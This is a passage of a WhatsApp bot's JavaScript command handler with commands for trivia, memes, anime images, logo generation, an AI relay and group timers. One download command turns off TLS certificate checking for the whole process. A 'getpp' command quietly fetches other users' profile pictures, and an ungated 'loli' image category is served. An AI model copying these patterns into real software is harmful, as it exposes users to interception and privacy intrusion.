            { q: "May the Force be with you.", a: "Star Wars" },
            { q: "I'll be back.", a: "Terminator" },
            { q: "Why so serious?", a: "The Dark Knight" },
            { q: "Hasta la vista, baby.", a: "Terminator 2" },
            { q: "I see dead people.", a: "The Sixth Sense" },
            { q: "Keep your friends close, but your enemies closer.", a: "The Godfather II" }
        ];
        const random = quotes[Math.floor(Math.random() * quotes.length)];
        reply(`🎬 *"${random.q}"*\n— ${random.a}`);
    }
}
break;

case "triviafact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const fact = res.data?.text || "You're awesome!";
        reply(`🧠 *Trivia Fact*\n\n${fact}`);
    } catch (e) {
        console.error("TRIVIA FACT ERROR:", e);
        reply("❌ *Trivia machine broke*");
    }
}
break;

case "cbhcchhcx": {
    try {
        const res = await axios.get("https://zenquotes.io/api/random", { timeout: 8000 });
        const quotes = Array.isArray(res.data) ? res.data : [res.data];
        const q = quotes[Math.floor(Math.random() * quotes.length)];
        reply(`🌟 *"${q.q || q.text}"*\n— ${q.a || q.author || "Unknown"}`);
    } catch (e) {
        console.error("INSPIRE ERROR:", e);
        reply("❌ *Inspiration unavailable*");
    }
}
break;

case "compliment": {
    try {
        const res = await axios.get("https://complimentr.com/api");
        const compliment = res.data?.compliment || "You are awesome!";
        reply(`💖 *${compliment}*`);
    } catch (e) {
        console.error("COMPLIMENT ERROR:", e);
        reply("❌ *Compliment machine is shy* • Try later");
    }
}
break;

case "dog": {
    try {
        const res = await axios.get("https://dog.ceo/api/breeds/image/random");
        const img = res.data?.message;
        if (!img) return reply("❌ *Dog ran away*");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐶 *Random Dog*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("DOG ERROR:", e);
        reply("❌ *Dog fetch failed* • On a walk");
    }
}
break;

case 'sfw': {
    try { const sfwUrl = await getAnimeImageUrl('sfw'); if (!sfwUrl) throw new Error('No image'); const sfwBuf = await getBuffer(sfwUrl); await devtrust.sendMessage(m.chat, { image: sfwBuf, caption: "✨ *CYBER SFW*" }, { quoted: m }); } catch { reply(`❌ *Failed to fetch sfw image*`); }
}
break;

case 'moe': {
    try { const moeUrl = await getAnimeImageUrl('moe'); if (!moeUrl) throw new Error('No image'); const moeBuf = await getBuffer(moeUrl); await devtrust.sendMessage(m.chat, { image: moeBuf, caption: "🌸 *CYBER Moe*" }, { quoted: m }); } catch { reply(`❌ *Failed to fetch moe image*`); }
}
break;

case 'aipic': {
    try { const aipUrl = await getAnimeImageUrl('aipic'); if (!aipUrl) throw new Error('No image'); const aipBuf = await getBuffer(aipUrl); await devtrust.sendMessage(m.chat, { image: aipBuf, caption: "🤖 *CYBER AI Pic*" }, { quoted: m }); } catch { reply(`❌ *Failed to fetch aipic image*`); }
}
break;

case 'hentai': {
    const _hentSenderNum = (m.sender || '').split('@')[0].split(':')[0];
    const _hentUnlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _hentSenderNum);
    const _hentBanned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _hentSenderNum);
    if (_hentBanned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_hentUnlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
    try { const hentUrl = await getAnimeImageUrl('hentai'); if (!hentUrl) throw new Error('No image'); const hentBuf = await getBuffer(hentUrl); await devtrust.sendMessage(m.chat, { image: hentBuf, caption: "🔞 *CYBER*" }, { quoted: m }); } catch { reply(`❌ *Failed to fetch hentai image*`); }
}
break;

case 'chinagirl': {
    try { const _u = await getAnimeImageUrl('chinagirl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🇨🇳 *CYBER China Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch chinagirl image*'); }
}
break;

case 'bluearchive': {
    try { const _u = await getAnimeImageUrl('bluearchive'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "📘 *CYBER Blue Archive*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch bluearchive image*'); }
}
break;

case 'boypic': {
    try { const _u = await getAnimeImageUrl('boypic'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "👦 *CYBER Boy Pic*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch boypic image*'); }
}
break;

case 'carimage': {
    try { const _u = await getAnimeImageUrl('carimage'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🏎️ *CYBER Car*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch carimage image*'); }
}
break;

case 'random-girl': {
    try { const _u = await getAnimeImageUrl('random-girl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "👧 *CYBER Random Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch random-girl image*'); }
}
break;

case 'hijab-girl': {
    try { const _u = await getAnimeImageUrl('hijab-girl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🧕 *CYBER Hijab Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch hijab-girl image*'); }
}
break;

case 'inCYBEResia-girl': {
    try { const _u = await getAnimeImageUrl('inCYBEResia-girl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🇮🇩 *CYBER InCYBEResia Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch inCYBEResia-girl image*'); }
}
break;

case 'japan-girl': {
    try { const _u = await getAnimeImageUrl('japan-girl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🇯🇵 *CYBER Japan Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch japan-girl image*'); }
}
break;

case 'korean-girl': {
    try { const _u = await getAnimeImageUrl('korean-girl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🇰🇷 *CYBER Korean Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch korean-girl image*'); }
}
break;

case 'loli': {
    try { const _u = await getAnimeImageUrl('loli'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🎀 *CYBER*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch loli image*'); }
}
break;

case 'malaysia-girl': {
    try { const _u = await getAnimeImageUrl('malaysia-girl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🇲🇾 *CYBER Malaysia Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch malaysia-girl image*'); }
}
break;

case 'profile-pictures': {
    try { const _u = await getAnimeImageUrl('profile-pictures'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🖼️ *CYBER Profile Pics*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch profile-pictures image*'); }
}
break;

case 'thailand-girl': {
    try { const _u = await getAnimeImageUrl('thailand-girl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🇹🇭 *CYBER Thailand Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch thailand-girl image*'); }
}
break;

case 'tiktokgirl': {
    try { const _u = await getAnimeImageUrl('tiktokgirl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🎵 *CYBER TikTok Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch tiktokgirl image*'); }
}
break;

case 'vietnam-girl': {
    try { const _u = await getAnimeImageUrl('vietnam-girl'); if (!_u) throw new Error('No image'); const _b = await getBuffer(_u); await devtrust.sendMessage(m.chat, { image: _b, caption: "🇻🇳 *CYBER Vietnam Girl*" }, { quoted: m }); } catch { reply('\u274c *Failed to fetch vietnam-girl image*'); }
}
break;

case "cat": {
    try {
        const res = await axios.get("https://api.thecatapi.com/v1/images/search");
        const img = res.data[0]?.url;
        if (!img) return reply("❌ *Cat napping* • Try again");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐱 *Random Cat*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("CAT ERROR:", e);
        reply("❌ *Cat fetch failed* • On a mouse hunt");
    }
}
break;

case "rps": {
    if (!text) return reply("🪨 *Choose:* rock, paper, scissors");
    
    const choices = ["rock", "paper", "scissors"];
    const userChoice = text.toLowerCase();
    if (!choices.includes(userChoice)) 
        return reply("❌ *Invalid choice* • Use rock, paper, scissors");

    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    let result = userChoice === botChoice ? "🤝 *Tie!*" :
        (userChoice === "rock" && botChoice === "scissors") ||
        (userChoice === "paper" && botChoice === "rock") ||
        (userChoice === "scissors" && botChoice === "paper") 
        ? "🎉 *You win!*" : "😢 *You lose!*";

    reply(`🪨 *RPS*\n\nYou: ${userChoice}\nBot: ${botChoice}\n${result}`);
}
break;

case "8ball": {
    const answers = [
        "It is certain ✅", "Without a doubt ✅", "Ask again later 🤔",
        "Cannot predict now 🤷", "CYBER't count on it ❌", "Very doubtful ❌"
    ];
    if (!text) return reply("🎱 *Ask me a question*");
    
    const answer = answers[Math.floor(Math.random() * answers.length)];
    reply(`🎱 *Question:* ${text}\n\n${answer}`);
}
break;

case "trivia": {
    try {
        const res = await axios.get("https://opentdb.com/api.php?amount=1&type=multiple");
        const trivia = res.data.results[0];
        const options = [...trivia.incorrect_answers, trivia.correct_answer]
            .sort(() => Math.random() - 0.5);
        
        reply(`❓ *${trivia.question}*\n\n${options.map((o,i)=>`${i+1}. ${o}`).join("\n")}`);
    } catch (e) {
        console.error("TRIVIA ERROR:", e);
        reply("❌ *Trivia unavailable*");
    }
}
break;

case "meme": {
    try {
        const res = await axios.get("https://meme-api.com/gimme");
        const meme = res.data;
        if (!meme?.url) return reply("❌ *Meme ran away*");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: meme.url },
                caption: `😂 *${meme.title}*`
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("MEME ERROR:", e);
        reply("❌ *Meme factory closed*");
    }
}
break;

case 'gfx':
case 'gfx2':
case 'gfx3':
case 'gfx4':
case 'gfx5':
case 'gfx6':
case 'gfx7':
case 'gfx8':
case 'gfx9':
case 'gfx10':
case 'gfx11':
case 'gfx12': {
    const [text1, text2] = text.split('|').map(v => v.trim());
    if (!text1 || !text2) {
        return reply(`🎨 *Usage:* ${prefix + command} text1 | text2`);
    }

    reply(`⏳ *Generating GFX...*`);

    try {
        reply(`⚠️ *${command.toUpperCase()} temporarily unavailable*\n\nThe text-to-image GFX API is currently down.\n\n*Try these working commands instead:*\n• .glitchtext <text>\n• .writetext <text>\n• .oogway <text>\n• .pikachu <text>`);
    } catch (err) {
        console.error(err);
        reply(`❌ *GFX generation failed*`);
    }
    break;
}



case 'advancedglow':
case 'blackpinklogo':
case 'blackpinkstyle':
case 'cartoonstyle':
case 'deletingtext':
case 'effectclouds':
case 'flag3dtext':
case 'flagtext':
case 'freecreate':
case 'galaxystyle':
case 'galaxywallpaper':
case 'glitchtext':
case 'glowingtext':
case 'gradienttext':
case 'lighteffects':
case 'logomaker':
case 'luxurygold':
case 'makingneon':
case 'multicoloredneon':
case 'neonglitch':
case 'papercutstyle':
case 'pixelglitch':
case 'royaltext':
case 'sandsummer':
case 'style1917':
case 'summerbeach':
case 'typographytext':
case 'underwatertext':
case 'watercolortext':
case 'writetext': {
    if (!text) {
        return reply(`\u{1F3A8} *Usage:* ${prefix + command} your text here\n\nExample: ${prefix + command} CYBER SEC`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '\u{1F3A8}', key: m.key } });
        
        // PrinceTech ephoto360 API mapping
        const princeMap = {
            'advancedglow': 'glossysilver',
            'blackpinklogo': 'glossysilver',
            'blackpinkstyle': 'glossysilver',
            'cartoonstyle': 'galaxy',
            'deletingtext': 'glossysilver',
            'effectclouds': 'galaxy',
            'flag3dtext': 'glossysilver',
            'flagtext': 'glossysilver',
            'freecreate': 'galaxy',
            'galaxystyle': 'galaxy',
            'galaxywallpaper': 'galaxy',
            'glitchtext': '1917',
            'glowingtext': 'glossysilver',
            'gradienttext': 'galaxy',
            'lighteffects': 'glossysilver',
            'logomaker': 'glossysilver',
            'luxurygold': 'glossysilver',
            'makingneon': '1917',
            'multicoloredneon': 'glossysilver',
            'neonglitch': 'glossysilver',
            'papercutstyle': 'papercut',
            'pixelglitch': 'papercut',
            'royaltext': 'glossysilver',
            'sandsummer': 'papercut',
            'style1917': '1917',
            'summerbeach': 'galaxy',
            'typographytext': '1917',
            'underwatertext': 'galaxy',
            'watercolortext': 'papercut',
            'writetext': 'glossysilver'
        };
        
        // Try PrinceTech first
        const style = princeMap[command] || 'glossysilver';
        const ptUrl = 'https://api.princetechn.com/api/ephoto360/' + style + '?apikey=prince&text=' + encodeURIComponent(text);
        
        let imageUrl = null;
        try {
            const ptRes = await axios.get(ptUrl, { timeout: 30000 });
            if (ptRes.data?.success && ptRes.data?.result?.image_url) {
                imageUrl = ptRes.data.result.image_url;
            }
        } catch (ptErr) {
            console.log('PrinceTech fallback for', command, ptErr.message);
        }
        
        // Fallback to popcat if PrinceTech fails
        if (!imageUrl) {
            const popcatMap = {
                'advancedglow': 'pikachu',
                'blackpinklogo': 'sadcat',
                'blackpinkstyle': 'sadcat',
                'cartoonstyle': 'pikachu',
                'deletingtext': 'unforgivable',
                'effectclouds': 'oogway',
                'flag3dtext': 'oogway',
                'flagtext': 'pikachu',
                'freecreate': 'sadcat',
                'galaxystyle': 'oogway',
                'galaxywallpaper': 'oogway',
                'glitchtext': 'unforgivable',
                'glowingtext': 'pikachu',
                'gradienttext': 'sadcat',
                'lighteffects': 'oogway',
                'logomaker': 'pikachu',
                'luxurygold': 'sadcat',
                'makingneon': 'oogway',
                'multicoloredneon': 'pikachu',
                'neonglitch': 'unforgivable',
                'papercutstyle': 'sadcat',
                'pixelglitch': 'unforgivable',
                'royaltext': 'oogway',
                'sandsummer': 'pikachu',
                'style1917': 'sadcat',
                'summerbeach': 'oogway',
                'typographytext': 'pikachu',
                'underwatertext': 'sadcat',
                'watercolortext': 'oogway',
                'writetext': 'pikachu'
            };
            const popcatType = popcatMap[command] || 'pikachu';
            imageUrl = 'https://api.popcat.xyz/' + popcatType + '?text=' + encodeURIComponent(text);
        }
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: imageUrl },
                caption: `\u{1F3A8} *${command.toUpperCase().replace(/([A-Z])/g, ' $1').trim()}*\n\nText: ${text}\n\u{2699} Powered by CYBER SEC PRO`
            }), 
            { quoted: m }
        );
        
        await devtrust.sendMessage(m.chat, { react: { text: '\u{2705}', key: m.key } });
    } catch (err) {
        console.error(command + ' error:', err);
        await devtrust.sendMessage(m.chat, { react: { text: '\u{274C}', key: m.key } });
        reply('\u{274C} *Logo generation failed. Try again later.*');
    }
}
break;

case 'getpp': {
    // Target priority: @mention → quoted msg → typed number → group sender
    // NOTE: In DM, m.chat === m.sender (Baileys behaviour), so "other person" is unknowable.
    // Always require an explicit target when in DM with no other context.
    let userss;

    if (m.mentionedJid[0]) {
        // @tagged someone
        userss = m.mentionedJid[0];
    } else if (m.quoted) {
        // replied to someone's message
        userss = m.quoted.sender;
    } else if (text) {
        // number typed (e.g. .getpp 923001234567)
        const cleaned = text.replace(/[^0-9]/g, '');
        if (!cleaned) {
            await devtrust.sendMessage(m.sender, {
                text: `❌ *Number sahi nahi hai*\n\nTarika:\n• ${prefix}getpp @someone\n• ${prefix}getpp 923001234567\n• Kisi ky message pe reply karo + ${prefix}getpp`
            });
            break;
        }
        userss = cleaned + '@s.whatsapp.net';
    } else {
        // No target at all
        if (!m.isGroup) {
            // DM mein m.chat === m.sender hota hai, target batana zaruri hai
            await devtrust.sendMessage(m.sender, {
                text: `📸 *Kisi ki DP chahiye?*\n\nYeh tarike use karo:\n\n• *@mention:* ${prefix}getpp @AliKaNumber\n• *Number:* ${prefix}getpp 923001234567\n• *Reply:* Kisi bhi message pe reply karo phir ${prefix}getpp likho\n\n_DM mein sirf target bata ke hi DP mil sakti hai_`
            });
            break;
        }
        // Group mein apni khud ki DP
        userss = m.sender;
    }

    const targetNum = userss.split('@')[0];

    let ppUrl = '';
    try {
        ppUrl = await devtrust.profilePictureUrl(userss, 'image');
    } catch { ppUrl = ''; }

    if (!ppUrl) {
        await devtrust.sendMessage(m.sender, {
            text: `❌ *DP nahi mili*\n\n👤 @${targetNum}\n\nWajah: DP private hai ya yeh number WhatsApp pe nahi hai`
        });
        break;
    }

    // Buffer download for reliable image delivery
    let ppBuf = null;
    try {
        const resp = await axios.get(ppUrl, { responseType: 'arraybuffer', timeout: 15000 });
        ppBuf = Buffer.from(resp.data);
    } catch { ppBuf = null; }

    // Silently deliver to command sender's DM — target has NO idea
    const ppPayload = ppBuf
        ? { image: ppBuf, caption: `📸 *Profile Picture*\n👤 @${targetNum}` }
        : { image: { url: ppUrl }, caption: `📸 *Profile Picture*\n👤 @${targetNum}` };

    await devtrust.sendMessage(m.sender, ppPayload);
}
break;

case 'yts': 
case 'ytsearch': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    if (!text) return reply(`🔍 *Example:* ${prefix + command} anime music`);
    
    let yts = require("yt-search");
    let search = await yts(text);
    
    let teks = `📺 *YouTube Search*\n\n"${text}"\n\n`;
    let no = 1;
    
    for (let i of search.all.slice(0,5)) {
        teks += `${no++}. *${i.title}*\n⏱️ ${i.timestamp} | 👀 ${i.views}\n🔗 ${i.url}\n\n`;
    }
    
    await devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: search.all[0].thumbnail },
            caption: teks
        }), 
        { quoted: m }
    );
}
break;

case 'animewlp': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    
    try {
        const waifudd = await axios.get(`https://nekos.best/api/v2/neko?amount=1`);
        const imgUrl = waifudd.data?.results?.[0]?.url;
        if (!imgUrl) throw new Error('No image');
        const imgBuf = await getBuffer(imgUrl);
        await devtrust.sendMessage(m.chat, 
            { image: imgBuf, caption: "🖼️ *Anime Wallpaper*" }, 
            { quoted: m }
        );
    } catch (err) {
        try {
            // Fallback: nekos.best
            const res = await axios.get(`https://nekos.best/api/v2/waifu?amount=1`);
            const imgUrl = res.data?.results?.[0]?.url;
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({ image: { url: imgUrl }, caption: "🖼️ *Anime Wallpaper*" }),
                { quoted: m }
            );
        } catch {
            reply('❌ *Error fetching wallpaper*');
        }
    }
}
break;

case 'resetlink': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    await devtrust.groupRevokeInvite(m.chat);
    reply("✅ *Group link reset*");
}
break;

case 'animedl': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    if (!q.includes("|")) {
        return reply("📌 *Format:* animedl Anime Name | Episode");
    }

    try {
        const [animeName, episode] = q.split("|").map(x => x.trim());
        const apiUrl = `https://draculazxy-xyzdrac.hf.space/api/Animedl?q=${encodeURIComponent(animeName)}&ep=${encodeURIComponent(episode)}`;

        process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
        
        const { data } = await axios.get(apiUrl, {
            httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
        });

        if (data.STATUS !== 200 || !data.download_link) {
            return reply("❌ *Episode not found*");
        }

        const { anime, episode: epNumber, download_link } = data;

        reply(`🎥 *${anime}* Ep ${epNumber}\n⏳ Downloading...`);

        await devtrust.sendMessage(m.chat, {
            document: { url: download_link },
            mimetype: "video/mp4",
            fileName: `${anime} - Episode ${epNumber}.mp4`
        }, { quoted: m });

    } catch (error) {
        console.error("❌ Anime Downloader Error:", error.message);
        reply("⚠️ *Server Error* • Try again later");
    }
}
break;

case 'animesearch': {
    if (!text) return reply(`🔍 *Which anime to search?*\n📌 *Example:* animesearch Naruto`);
    
    try {
        // Use Jikan API v4 (official MAL API, no scraping needed)
        const { data } = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=1&sfw=true`);
        const anime = data?.data?.[0];
        
        if (!anime) return reply(`❌ *Anime not found:* ${text}`);
        
        const genres = anime.genres?.map(g => g.name).join(', ') || 'N/A';
        const studios = anime.studios?.map(s => s.name).join(', ') || 'N/A';
        
        let animetxt = `🎌 *${anime.title}*\n`;
        if (anime.title_english && anime.title_english !== anime.title) {
            animetxt += `🔤 English: ${anime.title_english}\n`;
        }
        animetxt += `\n🎬 Type: ${anime.type || 'N/A'}\n` +
            `📺 Episodes: ${anime.episodes || '?'}\n` +
            `📈 Status: ${anime.status || 'N/A'}\n` +
            `⭐ Score: ${anime.score || 'N/A'} (${anime.scored_by?.toLocaleString() || 0} votes)\n` +
            `🏆 Rank: #${anime.rank || 'N/A'}\n` +
            `💫 Popularity: #${anime.popularity || 'N/A'}\n` +
            `🎭 Genres: ${genres}\n` +
            `🏢 Studio: ${studios}\n` +
            `📅 Aired: ${anime.aired?.string || 'N/A'}\n\n` +
            `📝 *Synopsis:*\n${(anime.synopsis || 'N/A').substring(0, 400)}${anime.synopsis?.length > 400 ? '...' : ''}`;
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: anime.images?.jpg?.large_image_url || anime.images?.jpg?.image_url },
                caption: animetxt
            }),
            { quoted: m }
        );
    } catch (err) {
        reply(`❌ *Anime search failed* • ${err.message?.substring(0, 100)}`);
    }
}
break;

case 'animehighfive':
case 'animecringe':
case 'animedance':
case 'animehappy':
case 'animeglomp':
case 'animesmug':
case 'animeblush':
case 'animewave':
case 'animesmile':
case 'animepoke':
case 'animewink':
case 'animebonk':
case 'animebully':
case 'animeyeet':
case 'animebite':
case 'animelick':
case 'animekill': {
    const action = command.replace('anime', '');
    // Map our menu action → real nekos.best endpoint (only valid endpoints).
    // Valid nekos.best actions: baka, bite, blush, bored, cry, cuddle, dance,
    // facepalm, feed, handhold, happy, highfive, hug, kick, kiss, laugh, nod,
    // nope, nom, pat, peck, poke, pout, punch, shoot, shrug, slap, sleep,
    // smile, smug, stare, think, thumbsup, tickle, wave, wink, yawn, yeet.
    const nekosMap = {
        highfive: 'highfive', cringe: 'facepalm', dance: 'dance',
        happy: 'happy', glomp: 'hug', smug: 'smug', blush: 'blush',
        wave: 'wave', smile: 'smile', poke: 'poke', wink: 'wink',
        bonk: 'punch', bully: 'kick', yeet: 'yeet', bite: 'bite',
        lick: 'nom', kill: 'shoot',
    };
    const nekosAction = nekosMap[action] || action;
    let _agifBuf = null;
    let _agifUrl = '';
    try {
        const res1 = await axios.get(`https://nekos.best/api/v2/${nekosAction}?amount=1`, {
            timeout: 10000, headers: { 'User-Agent': _ANIME_UA }
        });
        _agifUrl = res1.data?.results?.[0]?.url || '';
    } catch (_) { /* fall through to nekos.life GIF */ }

    // Fallback: nekos.life GIF endpoints (kiss / hug / slap / pat / smug)
    if (!_agifUrl) {
        const lifeGifMap = {
            kiss: 'kiss', hug: 'hug', slap: 'slap', pat: 'pat', smug: 'smug',
            glomp: 'hug', highfive: 'hug', wave: 'hug', smile: 'pat',
            blush: 'pat', poke: 'pat', wink: 'pat', happy: 'pat',
            bonk: 'slap', bully: 'slap', bite: 'slap', lick: 'kiss',
            kill: 'slap', cringe: 'pat', dance: 'pat', yeet: 'slap',
        };
        const lifeKey = lifeGifMap[action] || 'pat';
        try {
            const res2 = await axios.get(`https://nekos.life/api/v2/img/${lifeKey}`, {
                timeout: 10000, headers: { 'User-Agent': _ANIME_UA }
            });
            _agifUrl = res2.data?.url || '';
        } catch (_) {}
    }

    if (!_agifUrl) return reply(`❌ *Anime ${action} APIs down — try again in a min*`);

    try {
        _agifBuf = await getBuffer(_agifUrl);
        if (!_agifBuf || !Buffer.isBuffer(_agifBuf) || _agifBuf.length === 0) throw new Error('empty buffer');
        await devtrust.sendMessage(m.chat,
            { video: _agifBuf, gifPlayback: true, caption: `🎌 *Anime ${action}*` },
            { quoted: m }
        );
    } catch (sErr) {
        // Last-ditch: send as image URL (some GIFs play fine as image too)
        try {
            await devtrust.sendMessage(m.chat,
                { image: { url: _agifUrl }, caption: `🎌 *Anime ${action}*` },
                { quoted: m }
            );
        } catch (_) {
            reply(`❌ *Anime ${action} failed — try again*`);
        }
    }
}
break;

case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
    const nekosActionMap = {
        cry: 'cry', kill: 'kick', hug: 'hug', pat: 'pat', lick: 'kiss',
        kiss: 'kiss', bite: 'bite', yeet: 'yeet', bully: 'bonk', bonk: 'bonk',
        wink: 'wink', poke: 'poke', nom: 'nom', slap: 'slap', smile: 'smile',
        wave: 'wave', awoo: 'nya', blush: 'blush', smug: 'smug', glomp: 'hug',
        happy: 'happy', dance: 'dance', cringe: 'facepalm', cuddle: 'cuddle', highfive: 'highfive',
        shinobu: 'pat', handhold: 'handhold'
    };
    const action = nekosActionMap[command] || command;
    
    try {
        const { data } = await axios.get('https://nekos.best/api/v2/' + action + '?amount=1', { timeout: 15000 });
        const gifUrl = data?.results?.[0]?.url;
        if (!gifUrl) throw new Error('No GIF URL');
        
        // Download GIF buffer and send as video/GIF
        const gifBuffer = await getBuffer(gifUrl);
        await devtrust.sendMessage(m.chat, {
            video: gifBuffer,
            gifPlayback: true,
            caption: '🎌 *Anime ' + command + '*'
        }, { quoted: m });
    } catch (err) {
        reply('❌ *' + command + ' failed — try again*');
    }
}
break;

case 'ai': {
    if (!text) return reply('🤖 *Example:* ai Who is Mark Zuckerberg?');


    try {
        const { data } = await axios.post("https://text.pollinations.ai/", {
            model: { id: "gpt-4", name: "GPT-4", maxLength: 32000 },
            messages: [
                { role: "system", content: "CRITICAL LANGUAGE RULE: You MUST respond in the EXACT same language and script the user wrote in. If user writes in Roman Urdu (English letters for Urdu/Hindi words like 'kya', 'hai', 'karo', 'mujhe'), respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script (अ, आ, इ). NEVER use formal Urdu Nastaliq script (ا، ب، پ). ALWAYS match the user's exact script style." },
                { pluginId: null, content: text, role: "user" }
            ],
            temperature: 0.5
        });

        reply(`🤖 *AI*\n\n${data}`);

    } catch (e) {
        reply(`❌ *AI error* • ${e.message}`);
    }
}
break;

case 'idch': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!text) return reply("🔗 *Example:* link channel");
    if (!text.includes("https://whatsapp.com/channel/")) 
        return reply("❌ *Invalid channel link*");
    
    let result = text.split('https://whatsapp.com/channel/')[1];
    let res = await devtrust.newsletterMetadata("invite", result);
    
    let teks = `📢 *Channel Info*\n\n` +
        `🆔 ID: ${res.id}\n` +
        `👤 Name: ${res.name}\n` +
        `👥 Followers: ${res.subscribers}\n` +
        `✔️ Verified: ${res.verification == "VERIFIED" ? "Yes" : "No"}`;
    
    return reply(teks);
}
break;

case 'closetime': {
    if (!isCreator) return reply("🔒 *Owner only*");

    let unit = args[1];
    let value = Number(args[0]);
    if (!value) return reply("*Usage:* closetime 10 minute");

    let timer = unit === 'second' ? value * 1000 :
                unit === 'minute' ? value * 60000 :
                unit === 'hour' ? value * 3600000 :
                unit === 'day' ? value * 86400000 : null;
    
    if (!timer) return reply('*Choose:* second, minute, hour, day');

    reply(`⏳ *Closing in ${value} ${unit}*`);

    setTimeout(async () => {
        try {
            await devtrust.groupSettingUpdate(m.chat, 'announcement');
            reply(`🔒 *Group closed* • Only admins can message`);
        } catch (e) {
            reply('❌ Failed: ' + e.message);
        }
    }, timer);
}
break;

case 'opentime': {
    if (!isCreator) return reply("🔒 *Owner only*");

    let unit = args[1];
    let value = Number(args[0]);
    if (!value) return reply('*Usage:* opentime 5 second');

    let timer = unit === 'second' ? value * 1000 :
                unit === 'minute' ? value * 60000 :
                unit === 'hour' ? value * 3600000 :
                unit === 'day' ? value * 86400000 : null;
    
    if (!timer) return reply('*Choose:* second, minute, hour, day');

    reply(`⏳ *Opening in ${value} ${unit}*`);

    setTimeout(async () => {
        try {
            await devtrust.groupSettingUpdate(m.chat, 'not_announcement');
            reply(`🔓 *Group opened* • Everyone can message`);
        } catch (e) {
            reply('❌ Failed: ' + e.message);
        }
    }, timer);
}
break;

case 'fact': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    try {
        const nyash = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const ilovedavid = nyash.data.text || "Every odd number has an 'e' in it!";
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
                caption: ilovedavid
            }),
            { quoted: m }
        );
    } catch (error) {
        reply("❌ *Fact unavailable*");
    }
    break;
}

case 'listonline': {
    if (!isCreator) {
        return reply(`🔒 *CYBER Online*\n\nOwner only command.`);
    }
    
    if (!m.isGroup) {
